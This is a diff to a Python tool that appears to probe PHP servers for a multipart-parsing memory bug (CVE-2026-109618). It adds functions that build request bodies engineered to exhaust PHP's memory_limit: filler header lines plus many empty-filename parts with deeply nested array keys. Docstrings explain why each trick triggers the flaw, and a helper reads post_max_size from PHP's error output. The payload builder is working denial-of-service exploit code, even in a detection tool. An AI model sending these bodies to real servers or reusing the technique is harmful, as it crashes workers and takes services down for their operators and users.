@@ -204,3 +204,106 @@ class Signal(str, Enum):
     IN_BAND_FATAL = "in-band PHP fatal (memory exhausted in Unknown)"
     EMPTY_500 = "differential empty HTTP 500 (worker died mid-request)"
     UPSTREAM_DEAD = "frontend 502/503/504 (upstream worker died)"
+    EMPTY_200 = "HTTP 200 with empty body after control produced output"
+    BODY_DISCARDED = "body discarded by post_max_size (probe never parsed)"
+    NONE = "none"
+
+
+@dataclass
+class ProbeResult:
+    """One probe attempt and what it told us."""
+
+    index: int
+    size_mib: int
+    parts: int
+    response: Response
+    signal: Optional[Signal] = None
+    detail: str = ""
+
+
+# ---------------------------------------------------------------------------
+# Body construction
+# ---------------------------------------------------------------------------
+
+def build_probe_body(size_mib: int, parts: int, nested: int = NESTED_KEYS) -> bytes:
+    """
+    Build a multipart body engineered to exhaust memory_limit during parsing.
+
+    Structure:
+      - A boundary line.
+      - A run of header-like filler lines ("x:\\n") to pad the body to the
+        requested size cheaply. These are parsed as part headers, which is
+        itself memory-expensive relative to their wire size.
+      - `parts` copies of a file part whose field name is a deeply nested
+        array key and whose filename is empty.
+
+    Why the empty filename matters (Calif):
+      An RFC1867 part with filename="" carries no file data and is NOT counted
+      toward max_file_uploads, but PHP still creates all six $_FILES entries
+      (name, full_path, type, tmp_name, error, size). With a nested field name,
+      that hierarchy is built separately for each of the six entries. One short
+      record expands into many native HashTables, Buckets and string keys.
+
+    Why the nested key matters:
+      It routes the insertion through _zend_hash_str_add_or_update_i(), the
+      function that increments the hash-table counters before allocating the
+      key -- the ordering bug at the heart of CVE-2026-109618.
+    """
+    size = size_mib << 20
+    name = b"a[]" + (b"[a]" * nested)
+    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
+    base = part * parts
+
+    if size < len(base):
+        raise ValueError(
+            f"probe of {size} bytes cannot hold {parts} parts ({len(base)} bytes)"
+        )
+
+    # Pad with header lines. Each "x:\n" is 3 bytes on the wire but costs a
+    # header entry in PHP's parser.
+    filler = (size - len(base)) // 3
+    body = b"--\n" + (b"x:\n" * filler) + base[3:]
+    return body[:-1]
+
+
+def build_control_body() -> bytes:
+    """
+    A minimal, harmless multipart request.
+
+    Its only job is to establish a baseline: does this target produce output
+    for a normal multipart POST? Without that baseline, an empty 500 from the
+    probe is meaningless -- the target might always return empty 500s.
+    """
+    return b"--x\nContent-Disposition:name=a;filename=\n\n"
+
+
+CONTROL_BOUNDARY = "x"
+PROBE_BOUNDARY = ""
+
+
+def build_oversize_body(size: int) -> bytes:
+    """
+    A body of `size` bytes, used only to discover post_max_size.
+
+    It is deliberately NOT a valid probe: we want PHP to reject it and tell us
+    the limit, not to parse it. The empty-boundary multipart shape is reused so
+    that a host which *does* accept it still exercises the vulnerable path.
+    """
+    filler = b"x:\n" * max(1, size // 3)
+    return b"--\n" + filler
+
+
+def parse_post_max_size(body: bytes) -> Optional[int]:
+    """
+    Extract post_max_size from PHP's "exceeds the limit" warning.
+
+    PHP emits this during request startup when the body is larger than
+    post_max_size, and it names the configured limit in bytes. That turns a
+    rejection into useful information: we learn the exact ceiling instead of
+    guessing at it.
+
+    Returns None when the warning is absent (limit not hit, or display_errors
+    is off and the warning was suppressed).
+    """
+    if not body or POST_MAX_MARKER not in body:
+        return None
